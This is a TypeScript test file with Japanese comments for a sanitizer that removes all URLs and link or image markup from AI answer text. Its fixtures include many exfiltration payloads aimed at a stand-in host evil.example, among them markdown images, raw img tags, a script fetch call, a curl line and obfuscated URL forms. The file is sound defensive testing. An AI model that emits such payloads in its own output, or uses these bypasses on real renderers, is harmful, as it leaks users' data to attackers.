/**
 * 回答本文の無害化(sanitizeAnswerText。T-007 セキュリティレビュー 2026-09-27 M1、
 * RS-4 / TM-D2)。契約: 回答本文に URL を一切残さない(原典へのリンクは citations[].url
 * だけが運ぶ)。
 * - レビューで実証された迂回(参照定義+参照リンク/画像、入れ子の角括弧・山括弧・括弧を
 *   含む画像の宛先、`https&#58;//`・`https\://`・`http:evil` の参照定義、生 HTML の
 *   `<img src=…>`、自動リンク `evil.example/p`・大文字 `WWW.`・平文の `//evil…`・
 *   `mailto:`、私用領域文字による目印の偽造)のいずれでも、`evil` のホストと `LEAK` が
 *   本文に残らない
 * - 正当な本文(日本語・コード片・箇条書き・表・引用)は壊さない
 * - 最終検証(手順 5)が、手順 2〜4 の後に残った構文を除去して residual に数える
 */
import { describe, expect, it } from "vitest";
import {
  REMOVED_URL_MARKER,
  findUrlLikeSpans,
  sanitizeAnswerText,
  stripUnsafeCharacters,
} from "../src/index.js";

/** 無害化後の本文に、外部への送出に使える構文・値が残っていないことを確かめる。 */
function expectNoExfiltration(text: string): void {
  expect(text).not.toMatch(/evil\.example|EVIL\.EXAMPLE/);
  expect(text).not.toContain("LEAK");
  expect(text).not.toMatch(/https?:|mailto:|javascript:|www\./i);
  expect(text).not.toMatch(/!\[|\]\(|<img|<a /i);
  expect(findUrlLikeSpans(text)).toEqual([]);
}

describe("sanitizeAnswerText: レビューで実証された迂回を塞ぐ(M1)", () => {
  it.each([
    ["参照定義+参照画像・参照リンク", "![x][r] と [押す][r]\n\n[r]: //evil.example/p?d=LEAK"],
    ["参照定義(宛先が次の行・タイトル付き)", '[r]:\n  https://evil.example/p?d=LEAK "t"\n\n![x][r]'],
    ["参照定義(引用の中)", "> [r]: https://evil.example/p?d=LEAK\n\n![x][r]"],
    ["省略形の参照画像", "![r][]\n\n[r]: https://evil.example/p?d=LEAK"],
    ["入れ子の角括弧を含む画像", "![a [b] c](https://evil.example/x?d=LEAK)"],
    ["山括弧の宛先(空白入り)", "![x](<https://evil.example/a b?d=LEAK>)"],
    ["括弧を含む宛先", "![x](https://evil.example/a(b)c?d=LEAK)"],
    ["画像を含むリンク", "[![x](https://evil.example/i?d=LEAK)](https://evil.example/l?d=LEAK)"],
    ["`https&#58;//` の参照定義", "[r]: https&#58;//evil.example/p?d=LEAK\n![x][r]"],
    ["`https&#58;//` の inline 画像", "![x](https&#58;//evil.example/p?d=LEAK)"],
    ["`https\\://` の参照定義", "[r]: https\\://evil.example/p?d=LEAK\n![x][r]"],
    ["`http:evil` の参照定義", "[r]: http:evil.example/p?d=LEAK\n![x][r]"],
    ["生 HTML の img(引用符付き)", '<img src="https://evil.example/i.png?d=LEAK">'],
    ["生 HTML の img(引用符なし)", "<img src=//evil.example/i.png?d=LEAK>"],
    ["生 HTML の a", "<a href='https://evil.example/?d=LEAK'>here</a>"],
    ["自動リンク evil.example/p", "詳細は evil.example/p?d=LEAK を参照"],
    ["自動リンク(日本語に続けて)", "説明はevil.example/p?d=LEAKです"],
    ["大文字の WWW.", "WWW.EVIL.EXAMPLE/p?d=LEAK"],
    ["平文の //evil", "平文の //evil.example/p?d=LEAK です"],
    ["mailto:", "mailto:attacker@evil.example?body=LEAK"],
    ["<scheme:…> の自動リンク", "<https://evil.example/p?d=LEAK>"],
    ["私用領域の目印の偽造", "\uE000https://evil.example/p?d=LEAK\uE001 \uE0000\uE001"],
    ["ゼロ幅文字で分けたスキーム", "https\u200B://evil.example/p?d=LEAK"],
    ["ゼロ幅文字で分けた www.", "ww\u200Bw.evil.example/p?d=LEAK"],
    ["全角文字で組んだ URL", "ｈｔｔｐｓ：／／ｅｖｉｌ．ｅｘａｍｐｌｅ／ｐ？ｄ＝LEAK"],
    ["実体参照で組んだスラッシュ・ドット", "&#x2F;&#x2F;evil.example/q?d=LEAK と evil&period;example/r?d=LEAK"],
    ["バックスラッシュのプロトコル相対", "/\\evil.example/p?d=LEAK と \\\\\\\\evil.example/p?d=LEAK"],
    ["javascript: のリンクと平文", "[x](javascript:alert('LEAK')) と javascript:alert('LEAK')"],
    ["HTML コメント・script", "<!-- ![x](https://evil.example/c?d=LEAK) --><script>fetch('//evil.example/?d=LEAK')</script>"],
  ])("%s", (_label, input) => {
    const result = sanitizeAnswerText(input);
    expectNoExfiltration(result.text);
    expect(result.removed + result.residual).toBeGreaterThan(0);
  });

  it("リンクはテキストだけ、画像は代替テキストだけを残し、平文の URL は目印に置き換える", () => {
    const result = sanitizeAnswerText(
      [
        "締め日は毎月25日です([経費精算規程](https://alpha.example.test/docs/doc-1))。",
        "![図1 申請画面](https://alpha.example.test/img/1.png)",
        "問い合わせは https://evil.example/form?d=LEAK まで。",
      ].join("\n"),
    );
    expect(result.text).toBe(
      [
        "締め日は毎月25日です(経費精算規程)。",
        "図1 申請画面",
        `問い合わせは ${REMOVED_URL_MARKER} まで。`,
      ].join("\n"),
    );
    // 原典の URL(alpha.example.test)も本文には残さない(出典の url が運ぶ)
    expect(result.text).not.toContain("alpha.example.test");
    expect(result.removed).toBe(3);
    expect(result.residual).toBe(0);
  });

  it("コードの中の URL も除去する(本文に URL を一切残さない)が、コードの構文は保つ", () => {
    const result = sanitizeAnswerText(
      "`curl https://evil.example/api?d=LEAK` と\n```\nfetch(\"//evil.example/x\")\n```",
    );
    expect(result.text).toBe(
      `\`curl ${REMOVED_URL_MARKER}\` と\n\`\`\`\nfetch("${REMOVED_URL_MARKER}")\n\`\`\``,
    );
  });

  it("目印は Markdown の構文にならない(全角の括弧)", () => {
    expect(REMOVED_URL_MARKER).not.toMatch(/[[\]()<>!]/);
  });
});

describe("sanitizeAnswerText: 正当な本文を壊さない", () => {
  it("日本語・箇条書き・番号付きリスト・強調・見出し・表・引用・コード片はそのまま", () => {
    const text = [
      "## 経費精算の手順",
      "",
      "経費精算の締め日は**毎月25日**です。申請は経費精算システムから行います。",
      "",
      "1. 領収書を用意する",
      "2. 申請画面で `金額` と `日付` を入力する",
      "   - 交通費は区間も書く",
      "   - 注意[1]: 税込み金額で書く",
      "",
      "| 項目 | 期限 |",
      "|---|---|",
      "| 締め日 | 25日 |",
      "",
      "> 経費精算の締め日は毎月25日です。",
      ">> 二重の引用",
      "",
      "コード: `const ok = a < b && c > d ? x[0](y) : null;`",
      "",
      "```ts",
      "if (items.length < 3 && flags[0](x)) {",
      '  return `<div class="x">${html}</div>`;',
      "}",
      "```",
      "",
      "ファイルは README.md と packages/orchestrator/src/index.ts、担当は keiri@example.co.jp です。",
      "2026/09/27 10:30 に更新。例: 値は 1:2 の比率。",
    ].join("\n");
    expect(sanitizeAnswerText(text)).toEqual({ text, removed: 0, residual: 0 });
  });

  it("コードの外の < > はエスケープする(Markdown では同じ表示になる。行頭の引用記号は残す)", () => {
    expect(sanitizeAnswerText("注意: a < b かつ c > d の場合").text).toBe(
      "注意: a &lt; b かつ c &gt; d の場合",
    );
    expect(sanitizeAnswerText("> 引用 > 途中").text).toBe("> 引用 &gt; 途中");
    // エスケープした < もタグにしない
    expect(sanitizeAnswerText("\\<img src=x onerror=alert(1)\\>").text).toBe(
      "&lt;img src=x onerror=alert(1)&gt;",
    );
  });

  it("画像にならなかった `![` の `!` は落とす(本文に画像の構文を残さない)", () => {
    expect(sanitizeAnswerText("注意![重要] です。").text).toBe("注意[重要] です。");
  });
});

describe("最終検証(手順 5、fail-closed)", () => {
  it("手順 2〜4 の後に現れた構文(HTML の除去で成立した参照定義)も除去し、residual に数える", () => {
    // `<i>:</i>` を除くと `[r]: /api/logout` が参照定義として成立する(相対 URL は検出器に
    // かからないため、構文として消す)
    const result = sanitizeAnswerText("[r]<i>:</i> /api/logout\n\n[押す][r]");
    expect(result.residual).toBeGreaterThan(0);
    expect(result.text).not.toContain("/api/logout");
    expect(result.text).not.toMatch(/\[r\]/);
    expect(result.text.trim()).toBe("押す");
  });
});

describe("stripUnsafeCharacters(手順 1)", () => {
  it("私用領域・制御文字・書式文字(ゼロ幅・双方向制御)を除き、タブと改行は残す", () => {
    expect(stripUnsafeCharacters("a\uE000b\u0007c\u202Ed\u200Be\tf\r\ng\uDB80\uDC00h")).toBe(
      "abcde\tf\ngh",
    );
  });
});

describe("敵対的な長大入力でも線形時間(再レビュー 2026-09-27 must)", () => {
  // 連長が昇順に並ぶバッククォート連: 旧実装(候補ごとの前方走査)では
  // 約 32 万文字で 1.7 秒、約 128 万文字で 10 秒超だった
  function ascendingBacktickRuns(targetChars: number): string {
    const parts: string[] = [];
    let total = 0;
    for (let run = 1; total < targetChars; run += 1) {
      const chunk = `${"`".repeat(run)} x `;
      parts.push(chunk);
      total += chunk.length;
    }
    return parts.join("");
  }

  // 同じ連長の対が遠くにあり、間に空行を挟むため対応しない: 空行判定の線形化を確かめる
  function farPairedRuns(targetChars: number): string {
    const half = ascendingBacktickRuns(targetChars / 2).replace(/ x /g, " x\n\n");
    return `${half}${half}`;
  }

  it.each([
    ["昇順の連", ascendingBacktickRuns(1_200_000)],
    ["遠い対と空行", farPairedRuns(1_200_000)],
  ])("%s(約120万文字)を数秒以内に処理する", (_name, input) => {
    const started = performance.now();
    const result = sanitizeAnswerText(input);
    const elapsedMs = performance.now() - started;
    expect(typeof result.text).toBe("string");
    expect(elapsedMs).toBeLessThan(3_000);
  });
});
